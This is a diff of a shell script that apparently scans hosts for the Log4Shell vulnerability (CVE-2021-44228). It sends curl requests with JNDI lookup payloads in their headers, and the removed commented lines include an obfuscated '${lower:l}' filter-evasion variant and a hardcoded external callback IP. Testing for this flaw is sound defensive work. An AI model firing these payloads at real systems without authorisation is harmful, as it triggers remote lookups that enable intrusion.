@@ -50,9 +50,6 @@ timeout 2 curl -ksqL https://"$VAR001" -H "user-agent: \${jndi:ldaps://"$DEFAULT
 timeout 2 curl -ksqL https://"$VAR001" -H "user-agent: \${jndi:dns://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null
 timeout 2 curl -ksqL https://"$VAR001" -H "user-agent: \${jndi:rmi://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null
 
-#timeout 2 curl -ksqL http://"$VAR001" -H "X-API-Version: \${jndi:ldap://"$DEFAULT_INTERFACE":"$BADPORT"/Basic/Command/Base64/U0RQUi1NSVNPLVRlc3RpbmctTE9HNGotU0FGRUxZLUlHTk9SRQo=}"
-
-#timeout 2 curl -ksqL https://"$VAR001" -H "X-API-Version: \${jndi:ldap://"$DEFAULT_INTERFACE":"$BADPORT"/Basic/Command/Base64/U0RQUi1NSVNPLVRlc3RpbmctTE9HNGotU0FGRUxZLUlHTk9SRQo=}"
 
 #### Record 'just-before-STOP-time' of the payload execution.
 STOP_TIME=$(tail -n1 /var/log/messages | awk '{print $1,$2,$3}')
@@ -69,25 +66,3 @@ if [ -s /tmp/"$IP".out ]; then echo "$IP ${red}Is Vulnerable to CVE-2021-44228${
 
 
 
-
-
-
-
-
-
-
-####1111
-
-#rm -f /tmp/out; for i in $(cat "$1"); do timeout 2 curl -ksqL http://"$i" -H 'X-API-Version: ${jndi:ldap://52.60.39.195:"$BADPORT"/Basic/Command/Base64/U0RQUi1NSVNPLVRlc3RpbmctTE9HNGotU0FGRUxZLUlHTk9SRQo=}' 1> /dev/null 2>> /tmp/out ; done
-
-
-####2222
-
-#rm -f /tmp/out; for i in $(cat "$1"); do timeout 2 curl -ksqL http://"$i" -H 'x-api-version: ${jndi:${lower:l}${lower:d}a${lower:p}://52.60.30.195:"$BADPORT"/this-is-sdpr-miso-safely-ignore}' 1> /dev/null 2>> /tmp/out; done
-
-
-
-#cat /var/log/messages | grep -i log4jScanner >> ./log4j-report.txt  
-echo ""
-echo ""
-#cat /tmp/out
